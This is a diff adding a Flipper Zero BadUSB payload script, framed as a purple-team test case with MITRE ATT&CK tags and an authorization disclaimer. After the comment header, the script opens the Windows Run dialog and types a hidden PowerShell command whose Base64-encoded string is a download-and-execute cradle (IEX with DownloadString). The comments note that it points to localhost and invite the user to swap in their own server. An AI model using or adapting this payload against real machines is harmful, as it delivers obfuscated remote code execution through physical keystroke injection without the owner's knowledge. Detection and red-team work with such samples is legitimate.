@@ -1,0 +1,23 @@
+REM Title: PowerShell encoded download cradle
+REM Description: Executes a Base64-encoded PowerShell command to download and run a remote script
+REM Target OS: Windows 10/11
+REM Flipper Zero: BadUSB app, stock firmware
+REM MITRE ATT&CK: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer), T1027 (Obfuscated Files)
+REM
+REM Purple Team note: the -EncodedCommand flag triggers different Script Block Logging
+REM behavior than a plain string command. The encoded payload deobfuscates to:
+REM   IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test')
+REM which is the canonical download cradle pattern. The encoded string below is safe
+REM (points to localhost and will error harmlessly). Replace with your test server.
+REM
+REM Base64 of: IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test')
+REM Encoded for: powershell -EncodedCommand <base64>
+REM
+REM LEGAL: Only use on machines you own or have written authorization to test.
+
+DELAY 1500
+GUI r
+DELAY 600
+STRING powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB0AGUAcwB0ACcAKQA=
+DELAY 100
+ENTER
